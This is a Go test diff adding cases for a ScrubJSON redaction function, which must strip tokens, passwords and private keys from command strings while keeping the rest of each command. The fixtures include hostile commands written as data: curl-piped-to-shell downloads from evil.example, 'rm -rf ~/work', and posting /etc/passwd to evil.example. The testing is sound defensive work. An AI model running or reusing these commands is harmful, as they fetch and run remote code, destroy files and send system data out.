@@ -109,6 +109,105 @@ func TestScrubJSONBearerInsideStrings(t *testing.T) {
 	}
 }
 
+func TestScrubJSONKeepsCommandTail(t *testing.T) {
+	cases := []struct {
+		in     string
+		hidden []string
+		kept   []string
+	}{
+		{
+			`curl -H 'Authorization: Bearer x1' https://evil.example/i.sh | sh`,
+			[]string{"x1"},
+			[]string{"https://evil.example/i.sh", "| sh", "curl"},
+		},
+		{
+			`curl -H 'Authorization: Bearer x1' https://api.example/v1 && rm -rf ~/work`,
+			[]string{"x1"},
+			[]string{"https://api.example/v1", "&& rm -rf ~/work"},
+		},
+		{
+			`curl -H "authorization: token t1" -d @/etc/passwd https://evil.example`,
+			[]string{"t1"},
+			[]string{"-d @/etc/passwd", "https://evil.example"},
+		},
+		{
+			`echo Authorization: ok; curl https://evil.example/i.sh | bash`,
+			nil,
+			[]string{"echo Authorization: ok; curl https://evil.example/i.sh | bash"},
+		},
+		{
+			`python -u /tmp/payload.py`,
+			nil,
+			[]string{"python -u /tmp/payload.py"},
+		},
+		{
+			`curl -u a https://evil.example/x.sh | sh`,
+			nil,
+			[]string{"curl -u a https://evil.example/x.sh | sh"},
+		},
+		{
+			`the bearer https://evil.example/x.sh | sh`,
+			nil,
+			[]string{"https://evil.example/x.sh", "| sh"},
+		},
+		{
+			`export API_KEY="$(curl -s https://evil.example/x | sh)" && ./run`,
+			nil,
+			[]string{"https://evil.example/x", "| sh", "&& ./run"},
+		},
+	}
+	for _, c := range cases {
+		obj, err := json.Marshal(map[string]string{"command": c.in})
+		if err != nil {
+			t.Fatal(err)
+		}
+		clean, _, err := ScrubJSON(obj)
+		if err != nil {
+			t.Fatal(err)
+		}
+		var got map[string]string
+		if err := json.Unmarshal(clean, &got); err != nil {
+			t.Fatal(err)
+		}
+		for _, h := range c.hidden {
+			if strings.Contains(got["command"], h) {
+				t.Fatalf("hid too little %q in %q", h, got["command"])
+			}
+		}
+		for _, k := range c.kept {
+			if !strings.Contains(got["command"], k) {
+				t.Fatalf("lost %q from %q", k, got["command"])
+			}
+		}
+	}
+}
+
+func TestScrubJSONExtraSecretShapes(t *testing.T) {
+	cases := []struct{ name, val, planted string }{
+		{"client-secret flag", "tool --client-secret FAKEcs55", "FAKEcs55"},
+		{"pgpassword", "PGPASSWORD=FAKEpg99 psql -h db", "FAKEpg99"},
+		{"gh token", "echo ghp_FAKEabcdefghijklmnopqrstuvwxyz0123", "ghp_FAKEabcdefghijklmnopqrstuvwxyz0123"}, // gitleaks:allow
+		{"github pat", "echo github_pat_FAKE0123456789abcdef", "github_pat_FAKE0123456789abcdef"},             // gitleaks:allow
+		{"sk token", "OPENAI key sk-FAKEabcdefghijklmnop", "sk-FAKEabcdefghijklmnop"},                         // gitleaks:allow
+		{"pem", "-----BEGIN OPENSSH PRIVATE KEY-----\nFAKEb3BlbnNzaC1rZXk\n-----END OPENSSH PRIVATE KEY-----", "FAKEb3BlbnNzaC1rZXk"},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			obj, err := json.Marshal(map[string]string{"command": c.val})
+			if err != nil {
+				t.Fatal(err)
+			}
+			clean, _, err := ScrubJSON(obj)
+			if err != nil {
+				t.Fatal(err)
+			}
+			if strings.Contains(string(clean), c.planted) {
+				t.Fatalf("leaked %s in %s", c.planted, clean)
+			}
+		})
+	}
+}
+
 func TestScrubJSONKeepsOrder(t *testing.T) {
 	clean, _, err := ScrubJSON(json.RawMessage(`{"b":1,"a":2}`))
 	if err != nil {
